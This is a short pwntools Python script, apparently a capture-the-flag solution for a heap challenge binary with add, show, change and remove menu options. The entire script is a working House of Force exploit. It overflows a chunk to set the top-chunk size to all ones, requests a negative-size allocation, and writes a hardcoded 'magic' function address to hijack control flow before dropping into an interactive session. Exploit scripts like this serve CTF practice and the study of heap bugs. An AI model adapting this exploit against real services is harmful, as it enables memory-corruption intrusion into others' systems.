from pwn import *
context.arch = 'amd64'

#r = remote('csie.ctf.tw',10138)
r = remote('localhost',8888)

#r.interactive()
def add_item(size,name):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(name)
def show():
    r.recvuntil(':')
    r.sendline('1')
def change(idx,size,name):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(name)
def remove(idx):
    r.recvuntil(':')
    r.sendline('4')
    r.recvuntil(':')
    r.sendline(str(idx))

#add
add_item(0x40,'a'*12)#0
change(0,0x50,'b'*0x48 + p64(0xffffffffffffffff))

add_item(-0x80,'')#1 ,no payload ,i don't know why

magic = 0x400d49


add_item(0x10,p64(0xdeadbeef) + p64(magic))#2

#send exit
r.sendline('5')

r.interactive()
